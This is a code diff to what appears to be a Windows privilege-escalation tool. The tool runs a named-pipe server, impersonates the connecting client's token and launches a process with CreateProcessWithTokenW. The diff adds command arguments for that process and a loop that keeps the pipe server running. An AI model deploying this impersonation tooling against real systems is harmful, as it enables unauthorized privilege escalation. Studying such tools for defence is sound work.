@@ -13,6 +13,7 @@
 #include "common.h"
 
 extern wchar_t* commandline;
+extern wchar_t* arguments;
 
 DWORD WINAPI PipeServer(LPVOID lpParam)
 {
@@ -95,15 +96,19 @@ DWORD WINAPI PipeServer(LPVOID lpParam)
 
 
 			printf("[*] Token authentication using CreateProcessWithTokenW for launching: %S\n", commandline);
-
+			if (arguments != NULL)
+			{
+				printf("[*] Arguments: %S\n", arguments);
+				
+			}
 			//GetTokenInformation(hThreadToken, TokenSessionId, &sessionid, sizeof(sessionid), &Size);
 			///SetTokenInformation(pToken2, TokenSessionId, &sessionid, sizeof(sessionid));
 			RevertToSelf();
 
 			b2 = CreateProcessWithTokenW(pToken2,
 				0,
-				NULL,
 				commandline,
+				arguments,
 				CREATE_NEW_CONSOLE,
 				NULL,
 				NULL,
@@ -127,21 +132,24 @@ DWORD WINAPI PipeServer(LPVOID lpParam)
 }
 
 
-int CreatePipeServer(wchar_t* pipename)
+int CreatePipeServer(wchar_t* pipename, bool nostop)
 {
-	HANDLE hThread1 = NULL;
-	DWORD dwThreadId1 = 0;
-	
-	printf("[*] Creating Pipe Server thread..\n");
-	hThread1 = CreateThread(NULL, 0, PipeServer, pipename, 0, &dwThreadId1);
-
-	DWORD dwWait = WaitForSingleObject(hThread1, THREAD_TIMEOUT);
-
-	if (dwWait != WAIT_OBJECT_0)
+	do
 	{
-		wprintf(L"[-] Named pipe didn't received any connect request. Exiting ... \n");
-		exit(-1);
-	}
+		HANDLE hThread1 = NULL;
+		DWORD dwThreadId1 = 0;
+
+		printf("[*] Creating Pipe Server thread..\n");
+		hThread1 = CreateThread(NULL, 0, PipeServer, pipename, 0, &dwThreadId1);
+
+		DWORD dwWait = WaitForSingleObject(hThread1, THREAD_TIMEOUT);
+
+		if (dwWait != WAIT_OBJECT_0)
+		{
+			wprintf(L"[-] Named pipe didn't received any connect request. Exiting ... \n");
+			exit(-1);
+		}
+	}while (nostop);
 
 	return 1;
 }
